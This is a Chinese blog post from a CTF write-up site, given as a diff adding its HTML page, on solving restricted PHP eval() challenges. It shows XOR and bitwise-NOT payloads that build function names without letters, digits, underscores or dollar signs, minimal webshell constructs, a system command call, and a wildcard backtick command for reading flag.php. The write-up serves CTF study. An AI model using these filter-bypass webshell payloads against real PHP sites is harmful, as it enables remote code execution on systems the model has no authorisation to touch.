@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>关于受限的代码执行CTF题 - x1a0t&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=PHP,CTF>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">x1a0t&#39;s Blog</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/links" class="menu-item-link">Links</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/notes" class="menu-item-link">Notes</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">关于受限的代码执行CTF题</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2018-09-23</span>
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
+    
+  </div>
+  <div class="post-content">
+    <p>最近看到一系列有难度的CTF题，网上已经有大佬给出了充分的解答，在此记录一下</p>
+<h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><p>先看一下该系列的简单版本，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里需要通过控制<code>code</code>变量传入<code>eval</code>中，来达到代码执行<code>getFlag()</code>的目的。难点在于<code>code</code>中不能含有字母和数字，解决这个问题的方法在<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">p神的博客</a> ，其中的思想就是<strong>通过运算操作结合一些小技巧构造出字母</strong></p>
+<p>这里使用异或操作来构造字符，利用类似<code>$_</code>这样的变量进行传递，最终构造出一个payload:<br><code>?code=$_=(&#39;]&#39;^&#39;:&#39;).(&#39;^&#39;^&#39;;&#39;).(&#39;^&#39;^&#39;*&#39;).(&#39;&#123;&#39;^&#39;=&#39;).(&#39;@&#39;^&#39;,&#39;).(&#39;@&#39;^&#39;!&#39;).(&#39;&lt;&#39;^&#39;[&#39;);$_();&amp;_=getFlag</code></p>
+<p>但是明显超出了40的长度限制，于是利用字符串之间异或时，会采用对应字符进行异或的小技巧：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;]^^&#123;@@&lt;&#x27;</span>^<span class="string">&#x27;:;*=,![&#x27;</span>;<span class="comment">//getFlag</span></span><br></pre></td></tr></table></figure>
+
+<p>于是乎，得到一个更简短的payload:<br><code>?code=$_=&#39;]^^&#123;@@&lt;&#39;^&#39;:;*=,![&#39;;$_();</code></p>
+<p>更好的利用方式是，使用<code>$&#123;&#125;</code>来执行拼接字符串的操作，然后再进行动态执行函数，达到一个Webshell的效果:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=&quot;_&quot;.(&quot;~`~~&quot;^&quot;./-*&quot;);//$_=&#x27;_POST&#x27;</span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br></pre></td></tr></table></figure>
+
+<p>[POST]数据内容<code>_=getFlag&amp;__=</code></p>
+<h1 id="无"><a href="#无" class="headerlink" title="无_"></a>无<code>_</code></h1><p>如果进一步限制，使<code>code</code>中不能包含<code>_</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以作为变量名的还可以是一些特殊字符，比如汉字，于是<br><code>?code=$小=&#39;]^^&#123;@@&lt;&#39;^&#39;:;*=,![&#39;;$小();</code></p>
+<p>构造一个Webshell当然也没问题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$小=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;<span class="comment">//$小=&#x27;_GET&#x27;</span></span><br><span class="line">$&#123;$小&#125;[虫]($&#123;$小&#125;[师]);</span><br></pre></td></tr></table></figure>
+
+<p>[GET]数据内容<code>?虫=system&amp;师=touch+/tmp/success</code></p>
+<p>举一反三，取反操作也是类似的<br><code>?code=$小=~(%98%9A%8B%B9%93%9E%98);$小();</code><br>其中的URL编码是<code>getFlag</code>取反的结果</p>
+<p>另外，某师傅直接在<code>$&#123;&#125;</code>中使用构造的字符作为变量也是不错的方法，只是在这题里太长了<br><code>?code=$&#123;&quot;!&quot;^&quot;~&quot;&#125;=&quot;]%];,&lt;&lt;&quot;^&quot;:@)&#125;@][&quot;;$&#123;&quot;!&quot;^&quot;~&quot;&#125;();</code></p>
+<h1 id="无-1"><a href="#无-1" class="headerlink" title="无$"></a>无<code>$</code></h1><p>难度进一步提升，限制不能出现<code>$</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到题的时候懵了，不知道咋搞，结果群里有大佬提醒了通配符，想了想有一种可能的方法</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=?&gt;&lt;?=`/???/??? ????.???`?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>eval</code>的原因，需要用<code>?&gt;</code>去闭合前面的php结构，然后使用<code>&lt;?=?&gt;</code>去输出代码执行的结果，代码中用<code>`</code>反引号去执行命令，命令中使用通配符的方式去匹配<code>/bin/cat flag.php</code>绕过限制。</p>
+<p>为什么是可能的方法呢？因为自己本地没成功，而且这样题目中的注释就是个误导作用了</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a><br><a href="https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w">https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w</a></p>
+
+  </div>
+  <div class="post-footer">
+    <a href="#top" class="top">Post.Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2024
+  <span class="author">
+    x1a0t
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
